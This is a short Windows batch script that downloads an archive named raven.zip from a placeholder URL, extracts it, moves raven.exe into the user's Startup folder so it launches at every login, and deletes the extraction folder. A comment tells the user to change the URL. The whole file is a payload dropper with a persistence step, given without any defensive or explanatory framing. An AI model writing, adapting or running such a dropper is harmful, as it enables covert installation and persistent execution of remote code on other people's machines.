@REM MODIFY the url, else it won't work!
curl https://localhost:4000/raven.zip -so raven.zip && powershell -command "Expand-Archive -Force 'raven.zip' 'Raven'" && move Raven/raven.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" && rmdir Raven
